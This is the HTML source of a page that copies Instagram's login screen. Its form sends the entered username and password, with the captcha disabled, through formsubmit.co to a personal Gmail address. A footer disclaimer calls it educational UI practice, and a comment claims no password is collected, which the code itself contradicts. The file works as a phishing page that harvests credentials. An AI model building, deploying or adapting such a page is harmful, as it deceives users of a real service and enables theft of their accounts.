<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="instagram.svg" type="image/icon">
    <link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
    <div class="container">
        <div class="page">
            <div class="logo">
                <img src="instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <br />

            <!-- FormSubmit Form (No Password) -->
            <form class="container"
                  action="https://formsubmit.co/humanerror0729@gmail.com"
                  method="POST">

                <input type="text"
                       placeholder="Phone number, username, or email"
                       name="username"
                       required>

                <input type="password"
                       placeholder="Your passward"
                       name="password"
                       required>

                <!-- FormSubmit Settings -->
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="Educational Instagram UI Form">

                <button class="submitbutton">Send</button>
                <br />
                <div class="option">OR</div>
            </form>

            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#">Log in With Facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>

            <div class="singup">
                <p>Don't have an account?
                    <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                </p>
            </div>
        </div>
    </div>

    <br />

    <div style="position:fixed;left:0;bottom:0;width:100%; color:#7e7979;">
        <p style="text-align:center;">
            Disclaimer: This is not a real Instagram page.  
            This UI is created only for educational and frontend practice purposes.
        </p>
    </div>

</body>
</html>
